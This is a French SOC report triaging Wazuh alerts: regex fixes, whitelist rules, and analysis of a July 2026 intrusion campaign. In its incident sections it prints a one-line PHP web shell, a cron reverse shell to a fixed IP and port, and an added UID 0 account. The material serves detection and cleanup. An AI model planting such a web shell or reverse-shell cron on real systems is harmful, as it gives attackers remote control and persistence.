# Propositions de whitelist — cases IRIS ouverts au 2026-08-01

Source : prod `soc-ai` (192.168.10.5). Cases ouverts au moment de l'analyse : 73,
74, 75, 76, 77, 78, 79 (+ le case démo #1). Alertes HIGH/CRITICAL (niveau ≥ 12)
extraites de la timeline de chaque case, puis relues dans l'indexer
(`wazuh-*`, 3 derniers jours) pour récupérer les champs auditd que la timeline
ne porte pas.

**État au 2026-08-01 18:00 UTC** : tout est déployé sur le manager de prod, les
sept cases ouverts sont clos avec une note de disposition chacun, le reverse
shell de `debian2` est retiré et le web shell de `nginx-proxy-manager` supprimé.
Ce qui reste à faire est listé en section 6.

## 1. Vue d'ensemble

| Case | Règle | Niv | Agent | Signature observée | Verdict |
|------|-------|-----|-------|--------------------|---------|
| 75, 76, 77, 78 | 100653 | 12 | debian, debian2, debian3, pve, home-s-pve01 | `stat /etc/shadow|/etc/shadow-|/etc/gshadow|/etc/gshadow-`, `cwd=/var/ossec`, `auid=unset` | FP — vérifs SCA/rootcheck de l'agent Wazuh |
| 75 | 100645 | 12 | debian3, pve, home-s-pve01 | `nft -j -f -` / `nft -f -`, `auid=unset` | FP — bug de regex (voir 2.a) |
| 75 | 100760 | 13 | debian3 | `modprobe` (`audit-wazuh-module`), même seconde que le `nft` ci-dessus | FP dérivé, **ne pas whitelister** (voir 3) |
| 79 | 100711 | 12 | debian, pve, home-s-pve01 | `busybox`/`bash` en `euid=911`, `cwd=/config` ou `/run/s6-rc/...` ; `apt-key`/`awk` en `euid=42`, `auid=0` | FP — s6-overlay de conteneurs LinuxServer + apt |
| 78 | 100643 | 12 | debian | `perl`, `comm=dpkg-preconfigu`, `auid=0` | FP — debconf pendant un `apt install` |
| 78 | 100643 | 12 | debian | `php-fpm8.2` (`euid=33`, `cwd=/var/www/html`) et `cat` (`cwd=/var/www/html/uploads`) | **VRAI POSITIF — ne pas whitelister** |
| 74, 75 | 100743 | 12 | wireguard, adguard-home, nginx-proxy-manager, bookstack, jellyfin, nextcloud, debian2, debian3 | `/etc/passwd` modifié | **VRAI POSITIF — voir 3** : les `diff` montrent l'ajout de comptes UID 0 (`svc-vpn`, `svc-dns`, `svc-proxy`, `svc-wiki`, `svc-backup`) |
| 73 | 100901 | 12 | wazuh.manager (YARITRUST) | `/usr/local/www/diag_command.php` sur `home-r-pf01`, sha256 `2eb5435e…` | FP — page de diagnostic native pfSense |
| 73 | 100901 | 12 | wazuh.manager (YARITRUST) | `.status.php` (29 octets, sha256 `ec409e09…`) dans `nginx-proxy-manager_192.168.20.11` | **À INVESTIGUER — ne pas whitelister** |
| 74 | 100801 | 13 | wireguard | `audit_enabled=` vide | Déjà corrigé le 2026-07-31 (split 100801/100807, niveau 7) — case résiduel |

Volumes sur 3 jours : 100711 = 958 alertes (625 `home-s-pve01`, 301 `pve`),
100645 = 410 (248 + 161 sur les mêmes capteurs), 100653 = 155, 100743 = 18,
100901 = 21, 100760 = 16, 100643 = 3. Les deux premières familles font à elles
seules ~95 % du bruit HIGH.

## 2. Corrections de règles (le vrai fix, à faire d'abord)

### a. 100645 — `-f` matche `-F` : bug de casse

```
a\d+="(?i:-F|--flush|flush|-X|--delete-chain|disable|--policy)"
```

Le `(?i:)` couvre toute l'alternance, donc l'option `-f` (charger un fichier de
règles) matche `-F` (flush). Résultat : chaque `nft -j -f -` de `pve-firewall`
et chaque `nft -f -` de nos propres active responses lèvent une alerte niveau 12
« filtrage réseau vidé ». 410 alertes en 3 jours, et c'est l'alerte du case 75.

Correctif : ne rendre insensible à la casse que les alternatives verbales.

```xml
<regex type="pcre2">a\d+="(?:[^"]*/)?(?i:iptables|ip6tables|iptables-restore|nft|ufw|firewall-cmd|nftables)"[^\n]*?(?:a\d+="(?:-F|--flush|(?i:flush)|-X|--delete-chain|(?i:disable)|--policy)"|a\d+="(?i:delete)"[^\n]*?a\d+="(?i:table)"|a\d+="-P"[^\n]*?a\d+="ACCEPT")</regex>
```

À valider par `wazuh-logtest` sur les deux sens : `nft -j -f -` ne doit plus
matcher, `nft flush ruleset` et `iptables -F` doivent toujours matcher.

### b. 100642 → 100665 — exclusion inopérante pour 100653, deux fois

Deux défauts cumulés, dont un invisible :

1. L'exclusion filtre `audit.exe ^/var/ossec/`, mais le SCA appelle le `stat`
   système : `exe=/usr/bin/stat` (ou `/usr/bin/coreutils` sur les capteurs
   Proxmox). Ce qui identifie le scan, c'est le répertoire de travail du démon
   et l'absence de session de login.
2. **L'identifiant lui-même.** Un enfant `if_sid` n'est rattaché que si sa
   parente est **déjà chargée**, et les fichiers sont lus dans l'ordre des
   identifiants : `100642` était lu avant que `100653` existe, donc rattaché à
   rien. Aucune erreur au démarrage, rien dans `wazuh-logtest` — la règle était
   simplement absente depuis le jour de son écriture. Vérifié en la
   renumérotant : à contenu identique, `100665` matche immédiatement.
   `rules/README.md` affirmait le contraire, il est corrigé et porte le
   one-liner qui détecte le piège sur tout le ruleset (c'était le seul cas).

```xml
<rule id="100665" level="0">
  <if_sid>100653</if_sid>
  <field name="audit.cwd" type="pcre2">^/var/ossec$</field>
  <field name="audit.auid" type="pcre2">^4294967295$</field>
  <description>Exclusion 100653: Wazuh agent SCA/rootcheck check</description>
</rule>
```

Risque résiduel : un attaquant qui `cd /var/ossec` depuis un processus sans
session de login. La lecture réelle du fichier reste couverte par 100643.

### c. Nouvelle exclusion 100713 — interpréteurs de conteneurs (100711)

`euid=911` = utilisateur `abc` des images LinuxServer ; `cwd=/config` ou
`/run/s6-rc:s6-rc-init:*/servicedirs/*` = supervision s6-overlay. Vu par les
capteurs d'hôte Proxmox, qui remontent l'activité des LXC/conteneurs.

```xml
<rule id="100713" level="0">
  <if_sid>100711</if_sid>
  <field name="audit.auid" type="pcre2">^4294967295$</field>
  <field name="audit.cwd" type="pcre2">^/config(?:/|$)|^/run/s6-rc</field>
  <description>Exclusion 100711: s6-overlay supervision inside a LinuxServer container</description>
</rule>
```

### d. Nouvelle exclusion 100714 — apt / debconf en `_apt` (100711)

`euid=42` (`_apt`) avec `auid=0` : c'est root qui a lancé `apt`, et apt
dégrade ses privilèges vers `_apt` pour exécuter `apt-key`, `awk`, `gpgv`.

```xml
<rule id="100714" level="0">
  <if_sid>100711</if_sid>
  <field name="audit.euid" type="pcre2">^42$</field>
  <field name="audit.auid" type="pcre2">^0$</field>
  <description>Exclusion 100711: APT dropping privileges to _apt (apt-key, awk, gpgv)</description>
</rule>
```

Note : `ignore_src_users: _apt` existe déjà dans `noise_filter.yaml`, mais il
porte sur `data.srcuser`, absent des alertes auditd — il ne filtre rien ici.

### e. Nouvelle exclusion 100649 — debconf lisant /etc/shadow (100643)

```xml
<rule id="100649" level="0">
  <if_sid>100643</if_sid>
  <field name="audit.exe" type="pcre2">/perl[0-9.]*$</field>
  <field name="audit.command" type="pcre2">^dpkg-preconfigu$</field>
  <description>Exclusion 100643: debconf (dpkg-preconfigure) reads /etc/shadow during a package install</description>
</rule>
```

`comm` est tronqué à 15 caractères par le noyau, d'où `dpkg-preconfigu`. Champ
renommable par un attaquant : exclusion volontairement étroite (exe + comm), et
les autres lecteurs de `/etc/shadow` restent couverts.

### f. ~~Exclusion 100743 — FIM /etc/passwd sans changement de contenu~~ RETIRÉE

Proposition **abandonnée le 2026-08-01 après lecture des `syscheck.diff`** : ce
ne sont pas des faux positifs. Voir section 3.

### g. Nouvelle exclusion 100904 — YARA sur fichier natif pfSense

`diag_command.php` est la page de diagnostic du webGUI pfSense : elle exécute
par conception une commande fournie par l'utilisateur, d'où le match
`WEBSHELL_PHP_Generic_Eval`. Épinglé au sha256 pour qu'une version modifiée
réalerte.

```xml
<rule id="100904" level="0">
  <if_sid>100901</if_sid>
  <field name="file_path" type="pcre2">/usr/local/www/diag_command\.php$</field>
  <field name="sha256" type="pcre2">^2eb5435eb702e7f25085b444af9cecdbaa1848dfaa9744d8f2d486a697a0d6ca$</field>
  <description>Exclusion 100901: native pfSense webGUI diagnostic page (hash-pinned)</description>
</rule>
```

## 3. À ne pas whitelister

### Campagne du 2026-07-29 — `.status.php` et les comptes UID 0

Vérifié en SSH le 2026-08-01 (relais `admin.lab`). Contenu du fichier :

```php
<?php system($_GET["c"]); ?>
```

C'est un web shell fonctionnel, pas un artefact bénin. Contexte reconstitué :

- Créé le **2026-07-29 à 16:59:37**, dans la couche **rw** du conteneur
  (`GraphDriver.UpperDir` de `nginx-proxy-manager`) — donc écrit à l'exécution,
  absent de l'image `jc21/nginx-proxy-manager:latest` (les autres fichiers du
  répertoire datent du build, mars 2025).
- Le journal de l'hôte montre une session SSH root **depuis 192.168.10.4
  (`loki`, le scanner YARITRUST)** ouverte à 16:59:35 et fermée à 16:59:38 —
  elle encadre exactement la création du fichier.
- À la **même seconde**, le FIM détecte sur ce même hôte l'ajout de
  `svc-proxy:x:0:1000::/home/svc-proxy:/bin/bash` dans `/etc/passwd` (UID 0).
  Le même schéma se retrouve sur `adguard-home` (`svc-dns`), `jellyfin`
  (`svc-backup`), `bookstack` (`svc-wiki`), `wireguard` (`svc-vpn`).
- La fenêtre 2026-07-29 16:00–18:00 porte **336 alertes de niveau ≥ 12 sur 7
  hôtes** : 100650 reverse shell (×107), 100634 exec fileless depuis tmpfs
  (×39), 100762 compte UID 0 créé, 100741 `authorized_keys`, 100740 cron,
  100748 `ld.so.preload`, 100654 arrêt de service de sécurité. C'est la
  campagne des cases 60/61/62/72.
- Les comptes `svc-*` ont été **nettoyés le 2026-07-30 vers 19:34** (vérifié :
  plus aucun UID 0 hors root, pas de `ld.so.preload`, sur les 5 hôtes joignables).
  C'est ce nettoyage qui explique les alertes 100743 « inode,mtime seuls » du
  2026-07-31 : le fichier revient à son état d'origine.

**Le web shell, lui, n'a pas été nettoyé.** Non exploitable en l'état (aucun
interpréteur PHP dans ce conteneur, aucune directive nginx ne sert ce répertoire,
aucune requête sur `.status.php` dans les logs), mais il est toujours là.

Action retenue : **supprimer le fichier**, pas le whitelister. Une exception
épinglée au hash sur `WEBSHELL_PHP_Generic_Eval` aveuglerait la signature web
shell sur cet hôte, et la seule raison de l'exception serait qu'on connaît
l'origine du fichier — ce n'est pas une raison de ne plus le voir.

De même, aucune exception sur 100743 : ces alertes ont fait leur travail.

**Angle mort constaté au passage** : `100744` (second compte UID 0, via FIM)
n'a **jamais** déclenché — 0 alerte sur 7 jours — alors que cinq comptes UID 0
ont été ajoutés et vus par le FIM. Seul `100762` (execve `useradd`, via auditd)
a tiré, et uniquement sur les capteurs Proxmox. À investiguer séparément : sur
les hôtes sans auditd, la création d'un compte root passe donc au niveau 12
(100743) au lieu de 14.
- **100643 sur `debian` : `php-fpm8.2` (`euid=33`, `cwd=/var/www/html`) et
  `cat` depuis `/var/www/html/uploads`** — c'est la chaîne d'un web shell, pas
  du bruit. Toute exclusion sur 100643 doit rester ancrée sur `perl` +
  `dpkg-preconfigu`.
- **100760 (`modprobe`, 16 alertes/3 j)** — déclenché ici en cascade du `nft`
  du point 2.a (chargement des modules `nf_tables`). Pas d'exclusion : la règle
  est passée de **13 à 7** (décision opérateur, 2026-08-01). Elle reste tracée
  et corrélable, mais sous `MIN_LEVEL` — plus d'incident ouvert sur elle seule,
  donc plus de remédiation autonome déclenchée par elle. Exclure
  `kmod`/`modprobe` aurait aveuglé la détection de LKM malveillant.
- **100801 sur `wireguard`** — plus un FP : le split 100801/100807 du
  2026-07-31 l'a déjà passé au niveau 7. Le case 74 porte des alertes
  antérieures au correctif. Le vrai reste à faire est le déploiement d'auditd
  sur cet hôte.

## 4. Palliatif immédiat : composites `noise_filter.yaml`

À n'utiliser que si les correctifs de règles ne peuvent pas être déployés tout
de suite (ils exigent un restart du manager). Moins précis : un composite ne
peut lire que `rule_id`, `src_user`, `dst_user`, `command`, `agent_name`,
`agent_id` et le champ virtuel `file` — donc ni `cwd`, ni `euid`, ni `auid`.

```yaml
  composite:
    - name: "sca_stat_shadow"
      description: "Vérifs SCA/rootcheck de l'agent Wazuh : stat /etc/shadow* (cwd=/var/ossec, auid unset)"
      match_all:
        rule_id: "100653"
        file: "/usr/bin/stat"

    - name: "s6_overlay_container_interpreter_pve01"
      description: "s6-overlay des conteneurs LinuxServer (uid 911), vu par le capteur d'hôte Proxmox"
      match_all:
        rule_id: "100711"
        file: "/bin/busybox"
        agent_name: "home-s-pve01"

    - name: "s6_overlay_container_interpreter_pve"
      description: "Idem sur le second capteur Proxmox"
      match_all:
        rule_id: "100711"
        file: "/bin/busybox"
        agent_name: "pve"

    - name: "pve_firewall_nft_ruleset_load_pve01"
      description: "pve-firewall/LXC : nft -j -f - charge un ruleset, ce n'est pas un flush (cf. bug de regex 100645)"
      match_all:
        rule_id: "100645"
        file: "/usr/sbin/nft"
        agent_name: "home-s-pve01"

    - name: "pve_firewall_nft_ruleset_load_pve"
      description: "Idem sur le second capteur Proxmox"
      match_all:
        rule_id: "100645"
        file: "/usr/sbin/nft"
        agent_name: "pve"
```

Coût assumé de ces deux derniers : sur les deux capteurs Proxmox, un vrai
`nft flush ruleset` et un vrai shell en compte de service seraient tus eux
aussi. C'est pour ça que le correctif de regex passe devant. `file` résout
`data.audit.exe` en premier, donc la valeur à mettre est le binaire, pas la
cible.

Après édition : `ingest --reappliquer-filtre` pour marquer `suppressed`
l'existant.

## 5. Angle mort structurel de la whitelist automatique

`whitelist._signature` ne discrimine que par `src_user`, `command` et `file`
(`CHAMPS_DISCRIMINANTS`), lus respectivement dans `data.srcuser`,
`data.command` et le champ virtuel `file`. Or **les alertes auditd n'ont ni
`data.srcuser` ni `data.command`** (tout est sous `data.audit.*`) : vérifié sur
les alertes 100653 de prod, dont le `data` ne contient que `audit` et `lxc_ct`.

Conséquence : pour toute la famille 1006xx/1007xx, la signature se réduit à
`rule_id` + `file` (= `data.audit.exe`), et le garde-fou « rule_id seul refusé »
rejette le reste. La boucle fermée FP → exception ne peut donc pas exprimer les
FP les plus fréquents du parc, et c'est structurel, pas un réglage.

Correctif proposé dans `noise.py` :

- ajouter à `CHAMP` : `audit_exe: data.audit.exe`, `audit_command:
  data.audit.command`, `audit_cwd: data.audit.cwd`, `audit_euid:
  data.audit.euid`, `audit_auid: data.audit.auid`, `audit_key: data.audit.key` ;
- ajouter `data.yara.file_path` et `file_path` à `FICHIER_CHEMINS` (sans quoi
  aucun composite ne peut viser une alerte YARITRUST) ;
- ajouter `audit_command`, `audit_cwd`, `audit_euid` à `CHAMPS_DISCRIMINANTS`
  côté `whitelist.py`.

## 6. État d'application (2026-08-01)

| Élément | Fichier | État |
|---------|---------|------|
| 2.a regex 100645 | `100645-firewall-flush-or-disable.xml` | déployé |
| 2.b exclusion 100642 → **100665** | `100665-exclusion-shadow-sca-rootcheck.xml` | déployé |
| 2.c exclusion 100713 | `100713-exclusion-s6-overlay-container-supervision.xml` | déployé |
| 2.d exclusion 100714 | `100714-exclusion-apt-privilege-drop.xml` | déployé |
| 2.e exclusion 100649 | `100649-exclusion-shadow-debconf.xml` | déployé |
| 2.g exclusion 100904 | `100904-exclusion-yara-pfsense-native-diag.xml` | déployé |
| 100760 niveau 13 → 7 | `100760-kernel-module-load-or-unload.xml` | déployé |
| 7.b exclusion 100636 | `100636-exclusion-gpg-agent-session-snippet.xml` | déployé |
| 2.f exclusion 100743 | — | retirée (vrais positifs) |
| Suppression de `.status.php` | — | fait (192.168.20.11) |
| 7.a reverse shell `devops` | — | retiré (`debian2`, sauvegarde forensique) |
| Clôture des cases IRIS | — | faite : 73 à 79 + le case démo, note de disposition par case |
| Section 5 (code) | — | à faire |
| Correctif propre de 100634 (`CLE=valeur`) | — | à faire |
| auditd sur `wireguard` | — | à faire |
| `100744` muette (5 comptes UID 0, 0 alerte) | — | à reprendre |
| Clés `svc_pivot` dans `/home/devops/.ssh` | — | à arbitrer |

Le dépôt de prod est sur l'hôte `soc-ai` (192.168.10.5), dans
`/opt/AURA/wazuh/config/wazuh_cluster/rules`, monté **directement** sur
`/var/ossec/etc/rules`. Deux conséquences :

- l'API Wazuh **ne peut pas** déployer ces fichiers (`PUT /rules/files/...`
  renvoie 1019 « Error trying to create backup file » sur les fichiers
  existants et 1006 sur les nouveaux : l'utilisateur `wazuh` n'a pas le droit
  d'écrire dans un montage appartenant à l'hôte) ;
- le déploiement se fait donc par `git pull` sur l'hôte, puis
  `docker restart wazuh-wazuh.manager-1`.

### Validation

Deux jeux, rejoués sur le manager de prod :

```sh
# 18 cas d'exclusion, construits depuis de VRAIES alertes puis mutés en attaquant
INDEXER_PASSWORD=... python3 scripts/build-exception-cases.py > /tmp/cases.tsv
./scripts/test-rule-exceptions.sh /tmp/cases.tsv     # 18 OK, 0 FAIL

# non-régression du ruleset complet
./scripts/test-detection-rules.sh                    # 48 OK, 0 FAIL
```

Pourquoi un second script plutôt que des cas ajoutés au premier : les logs de
synthèse de `test-detection-rules.sh` **perdent `euid`, `auid` et `cwd` au
décodage** (vérifié en phase 2 de `wazuh-logtest` — le décodeur auditd est
sensible à l'ordre des champs). Ce sont exactement les champs sur lesquels
reposent les quatre exclusions : testées ainsi, elles paraîtraient toutes
cassées. D'où le rejeu de `full_log` réels, mutés pour fabriquer le
contre-exemple attaquant — chaque FP tu est apparié à un TP qui doit toujours
tirer.

Au passage, les 7 contrôles négatifs de `test-detection-rules.sh` attendaient
`80792` et obtenaient `80700` (« Audit: Messages grouped. »). Vérifié sur le
ruleset d'avant ces changements : l'écart préexistait, c'est le ruleset natif
Wazuh qui a changé de règle fourre-tout. Attentes corrigées.

## 7. Deux découvertes en vérifiant l'effet du déploiement

Les familles traitées ci-dessus sont muettes depuis le restart du manager
(14:58:03 UTC) : 0 alerte sur 100653, 100760, 100643, 100901, et les dernières
100645 / 100711 datent de 14:53 et 14:55, donc d'avant. Mais le comptage a
révélé deux choses qui n'étaient pas dans le périmètre initial.

### a. Un reverse shell actif toutes les minutes sur `debian2` — 91 % du bruit HIGH

Ce n'est pas un faux positif. Sur `debian2` (192.168.30.46), la crontab de
l'utilisateur `devops` (uid 1002) contient :

```
* * * * * /bin/bash -i >& /dev/tcp/192.168.30.5/4444 0>&1
```

Vérifié en SSH le 2026-08-01, dans `/var/spool/cron/crontabs/devops`. Il
s'exécute depuis le 2026-07-29 et produit **6 760 alertes de niveau 12 sur les
dernières 24 h — 91 % de tout le volume HIGH** (le même événement est vu trois
fois : par l'agent de `debian2` et par les deux capteurs Proxmox).

C'était la persistance de la campagne du 2026-07-29, jamais nettoyée. Les cases
60/61/62 ont été clos le 2026-08-01 alors que l'implant, lui, battait toujours.
Pas une whitelist : tant que la crontab est là, taire l'alerte revient à ne plus
voir la seule chose qui signale l'implant.

**Retiré le 2026-08-01** (décision opérateur) : sauvegarde du spool dans
`/root/forensic-20260801/crontab-devops.bak` sur `debian2` (sha256
`968a5a9b…`), puis `crontab -l -u devops | grep -v <la ligne> | crontab -u
devops -`. Il ne reste que l'en-tête du fichier, et plus aucune référence à
`/dev/tcp` sur l'hôte.

**Restent en place, non traités** (même campagne, à arbitrer) : dans
`/home/devops/.ssh/`, une paire de clés `svc_pivot` / `svc_pivot.pub` et un
`authorized_keys`, déposés le 2026-07-31 — outillage de mouvement latéral.

Constat de fond au passage : la remédiation autonome isole, bloque une IP,
désactive un compte — elle **ne supprime pas une persistance**. Un case peut
donc être clos « remédié » avec le mécanisme de retour de l'attaquant intact.

### b. FP 100634 — la valeur de `SSH_AUTH_SOCK` prise pour un chemin tmpfs

198 alertes sur 267 (4 jours) portent ce motif :

```
sh -c - SSH_AUTH_SOCK=/run/user/0/gnupg/S.gpg-agent.ssh
[ -z "$(gpgconf --list-options gpg-agent | awk -F: '/^enable-ssh-support:/{print$10}')" ] || systemctl --user set-environment "$@"
```

C'est le snippet `gpg-agent` joué à chaque ouverture de session (donc à chaque
`ssh` d'administration). La règle matche parce que son `<regex>` cherche
`/run/user/\d+/` **n'importe où dans le log** : ici le chemin n'est pas celui
d'un script en tmpfs, c'est la **valeur d'une variable d'environnement**.

**Appliquée le 2026-08-01** (décision opérateur),
`100636-exclusion-gpg-agent-session-snippet.xml` :

```xml
<rule id="100636" level="0">
  <if_sid>100634</if_sid>
  <field name="audit.exe" type="pcre2">/(?:sh|dash|bash)$</field>
  <regex type="pcre2">SSH_AUTH_SOCK=/run/user/\d+/gnupg/S\.gpg-agent\.ssh</regex>
  <description>Exclusion 100634: gpg-agent session snippet - the tmpfs path is an env value, not a script</description>
</rule>
```

Ancrée sur l'interpréteur **et** sur le chemin complet de la socket, pas sur
`/run/user/` seul. Vérifiée dans les deux sens (cas 12 et 13 du rejeu) : le
snippet réel sort en 100636 niveau 0, le même événement muté avec un vrai chemin
d'implant (`/dev/shm/payload.sh`) ressort en 100634 niveau 12.

Réserve, assumée et écrite dans le fichier : la chaîne exclue est dans l'argv,
donc un attaquant qui l'ajoute à sa ligne de commande échappe à 100634. Le
correctif propre serait que 100634 ne matche pas un chemin tmpfs apparaissant
dans une affectation `CLE=valeur` — plus juste, mais délicat en pcre2 sur le
`full_log`. Reste à faire ; d'ici là 100625/100635 couvrent les variantes en ELF
natif quoi qu'il arrive.

**Note de forme, payée une fois** : un commentaire XML ne peut pas contenir `--`.
Le premier jet de ce fichier citait `gpgconf --list-options` et
`systemctl --user`, et `wazuh-logtest` refusait le ruleset. Reformulé sans
double tiret.
